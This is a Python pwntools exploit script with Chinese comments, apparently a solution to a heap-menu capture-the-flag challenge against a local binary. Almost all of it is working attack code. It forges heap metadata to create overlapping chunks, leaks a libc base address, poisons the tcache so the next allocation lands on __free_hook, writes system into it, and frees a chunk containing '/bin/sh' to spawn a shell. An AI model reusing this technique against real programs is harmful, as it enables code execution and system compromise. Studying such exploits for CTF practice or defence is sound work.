from pwn import *

io = process("./service")

libc = ELF("./libc.so.6")


def select(id: int):
    io.recvuntil(b"> ")
    io.sendline(str(id).encode())


def show(idx: int):
    select(4)
    io.recvuntil(b"Input index: ")
    io.sendline(str(idx).encode())
    print("show ", idx)


def edit(idx: int, content: bytes):
    select(3)
    io.recvuntil(b"Input index: ")
    io.sendline(str(idx).encode())
    sleep(0.1)
    io.send(content)
    print("edit ", idx)


def add(size: int):
    select(1)
    io.recvuntil(b"Input size: ")
    io.sendline(str(size).encode())
    print("add ", hex(size))


def delete(idx: int):
    select(2)
    io.recvuntil(b"Input index: ")
    io.sendline(str(idx).encode())
    print("delete ", idx)


# 准备堆布局
add(0x1F8)  # 0
add(0x1F8)  # 1
add(0x1F8)  # 2
add(0x208)  # 3

for _ in range(7):
    add(0x1F8)  # 4 ~ 10

# 让 chunk0 进入 unsorted bin
for i in range(6):
    delete(5 + i)

delete(1)
delete(0)

edit(2, b"a" * 0x1F8)
# 伪造 PREV_SIZE = 0x600 跨越 chunk0 到 chunk3 之间的 3 个chunk
edit(2, b"a" * 0x1F0 + p64(0x600))

edit(3, p64(0x21) * 0x41)
edit(4, p64(0x21) * 0x3F)

delete(3)  # 合并

add(0x278) # 0
show(0)

#  chunk3 伪造的 matadata 负责制造重叠，重叠 chunk 负责修改 tcache 链
libc_base = int(io.recv(12), 16) - 0x3EC190
print("libc address =", hex(libc_base))

free_hook = libc.sym["__free_hook"] + libc_base
system = libc.sym["system"] + libc_base

print("free_hook address =", hex(free_hook))
print("systtem address =", hex(system))

# chunk 0 + 0x1f8: chunk1 的 size
# chunk0 + 0x200 : chunk1 的用户区，也就是 tcache fd
edit(0, b"/bin/sh\x00" + b"a" * 0x1F0 + p64(0x201) + p64(free_hook))

gdb.attach(io)
add(0x1f8) # 1
add(0x1f8) # 2
edit(3, p64(system))

delete(0)

io.interactive()

